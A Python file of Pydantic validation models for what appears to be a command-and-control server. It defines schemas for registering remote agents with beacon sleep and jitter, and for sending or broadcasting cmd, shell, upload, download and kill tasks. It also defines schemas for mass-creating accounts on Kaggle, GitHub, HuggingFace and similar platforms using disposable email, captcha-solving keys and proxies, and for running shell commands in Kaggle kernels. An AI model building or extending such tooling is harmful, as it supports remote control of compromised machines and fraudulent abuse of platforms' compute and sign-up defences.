#!/usr/bin/env python3
"""Pydantic models for API validation."""

from typing import Optional, List, Dict, Any
from datetime import datetime
from pydantic import BaseModel, Field, validator, EmailStr
import re

# ============= AGENT MODELS =============

class AgentRegister(BaseModel):
    """Agent registration data."""
    id: str = Field(..., min_length=8, max_length=64)
    hostname: str = Field(..., min_length=1, max_length=255)
    username: str = Field(..., min_length=1, max_length=255)
    os: str = Field(..., min_length=1, max_length=255)
    arch: str = Field(..., min_length=1, max_length=64)
    ip_internal: Optional[str] = None
    platform_type: str = Field(default="machine", max_length=64)
    
    @validator('id')
    def validate_id(cls, v):
        if not re.match(r'^[a-zA-Z0-9_-]+$', v):
            raise ValueError('ID must contain only alphanumeric, underscore, or dash')
        return v

class AgentUpdate(BaseModel):
    """Agent update data."""
    group_name: Optional[str] = Field(None, max_length=255)
    tags: Optional[List[str]] = None
    note: Optional[str] = Field(None, max_length=1000)
    sleep_interval: Optional[int] = Field(None, ge=1, le=3600)
    jitter: Optional[int] = Field(None, ge=0, le=100)
    platform_type: Optional[str] = Field(None, max_length=64)

# ============= TASK MODELS =============

class TaskCreate(BaseModel):
    """Task creation data."""
    agent_id: str = Field(..., min_length=8, max_length=64)
    type: str = Field(default="cmd", max_length=64)
    payload: str = Field(..., min_length=1, max_length=10000)
    
    @validator('type')
    def validate_type(cls, v):
        allowed = ['cmd', 'shell', 'upload', 'download', 'kill', 'sleep']
        if v not in allowed:
            raise ValueError(f'Type must be one of: {", ".join(allowed)}')
        return v

class TaskBroadcast(BaseModel):
    """Broadcast task data."""
    type: str = Field(default="cmd", max_length=64)
    payload: str = Field(..., min_length=1, max_length=10000)
    target: str = Field(default="all", max_length=255)
    
    @validator('type')
    def validate_type(cls, v):
        allowed = ['cmd', 'shell', 'upload', 'download', 'kill', 'sleep']
        if v not in allowed:
            raise ValueError(f'Type must be one of: {", ".join(allowed)}')
        return v

# ============= AUTOREG MODELS =============

class AutoregStart(BaseModel):
    """Auto-registration start data."""
    platform: str = Field(..., max_length=64)
    mail_provider: str = Field(default="boomlify", max_length=64)
    custom_url: Optional[str] = Field(None, max_length=500)
    count: int = Field(default=1, ge=1, le=50)
    headless: bool = Field(default=True)
    proxy: Optional[str] = Field(None, max_length=500)
    parallel: int = Field(default=1, ge=1, le=3)
    browser: str = Field(default="firefox", max_length=32)
    
    @validator('platform')
    def validate_platform(cls, v):
        allowed = ['kaggle', 'github', 'huggingface', 'replit', 'paperspace', 'lightning_ai', 'custom']
        if v not in allowed:
            raise ValueError(f'Platform must be one of: {", ".join(allowed)}')
        return v
    
    @validator('browser')
    def validate_browser(cls, v):
        if v not in ['chrome', 'firefox']:
            raise ValueError('Browser must be chrome or firefox')
        return v

class AccountUpdate(BaseModel):
    """Account status update."""
    status: str = Field(..., max_length=64)
    
    @validator('status')
    def validate_status(cls, v):
        allowed = ['registered', 'verified', 'created', 'failed', 'banned', 'active']
        if v not in allowed:
            raise ValueError(f'Status must be one of: {", ".join(allowed)}')
        return v

# ============= KAGGLE MODELS =============

class KaggleExec(BaseModel):
    """Kaggle command execution."""
    username: str = Field(..., min_length=1, max_length=255)
    type: str = Field(default="shell", max_length=64)
    payload: str = Field(..., min_length=1, max_length=10000)
    timeout: int = Field(default=300, ge=10, le=3600)

class KaggleBatch(BaseModel):
    """Kaggle batch commands."""
    username: str = Field(..., min_length=1, max_length=255)
    commands: List[Dict[str, Any]] = Field(..., min_items=1, max_items=50)
    timeout: int = Field(default=300, ge=10, le=3600)

class KaggleKernelExec(BaseModel):
    """Kaggle kernel command execution."""
    kernel_id: str = Field(..., min_length=1, max_length=255)
    command: str = Field(..., min_length=1, max_length=10000)

# ============= CONFIG MODELS =============

class ConfigUpdate(BaseModel):
    """Configuration update."""
    webhook_discord: Optional[str] = Field(None, max_length=500)
    webhook_telegram: Optional[str] = Field(None, max_length=500)
    encryption_key: Optional[str] = Field(None, min_length=16, max_length=128)
    agent_token: Optional[str] = Field(None, min_length=8, max_length=128)
    public_url: Optional[str] = Field(None, max_length=500)
    public_url_kaggle: Optional[str] = Field(None, max_length=500)
    cloudflare_tunnel_token: Optional[str] = Field(None, max_length=500)
    captcha_api_key: Optional[str] = Field(None, max_length=128)
    fcb_api_keys: Optional[str] = Field(None, max_length=2000)
    boomlify_api_keys: Optional[str] = Field(None, max_length=2000)
    mail_provider: Optional[str] = Field(None, max_length=64)

# ============= USER MODELS =============

class UserCreate(BaseModel):
    """User creation data."""
    username: str = Field(..., min_length=3, max_length=64)
    password: str = Field(..., min_length=4, max_length=128)
    role: str = Field(default="operator", max_length=32)
    
    @validator('username')
    def validate_username(cls, v):
        if not re.match(r'^[a-zA-Z0-9_-]+$', v):
            raise ValueError('Username must contain only alphanumeric, underscore, or dash')
        return v
    
    @validator('role')
    def validate_role(cls, v):
        if v not in ['admin', 'operator', 'viewer']:
            raise ValueError('Role must be admin, operator, or viewer')
        return v

class PasswordChange(BaseModel):
    """Password change data."""
    current: str = Field(..., min_length=1, max_length=128)
    new: str = Field(..., min_length=4, max_length=128)

# ============= SCHEDULED TASK MODELS =============

class ScheduledTaskCreate(BaseModel):
    """Scheduled task creation."""
    name: str = Field(..., min_length=1, max_length=255)
    type: str = Field(default="cmd", max_length=64)
    payload: str = Field(..., min_length=1, max_length=10000)
    target: str = Field(default="all", max_length=255)
    interval: int = Field(default=3600, ge=60, le=86400)
    
    @validator('type')
    def validate_type(cls, v):
        allowed = ['cmd', 'shell', 'upload', 'download']
        if v not in allowed:
            raise ValueError(f'Type must be one of: {", ".join(allowed)}')
        return v

# ============= HELPER FUNCTIONS =============

def validate_request(model: BaseModel, data: dict) -> tuple:
    """
    Validate request data against Pydantic model.
    
    Returns:
        (is_valid, validated_data_or_errors)
    """
    try:
        validated = model(**data)
        return True, validated.dict()
    except Exception as e:
        errors = []
        if hasattr(e, 'errors'):
            for err in e.errors():
                field = '.'.join(str(x) for x in err['loc'])
                errors.append(f"{field}: {err['msg']}")
        else:
            errors.append(str(e))
        return False, errors
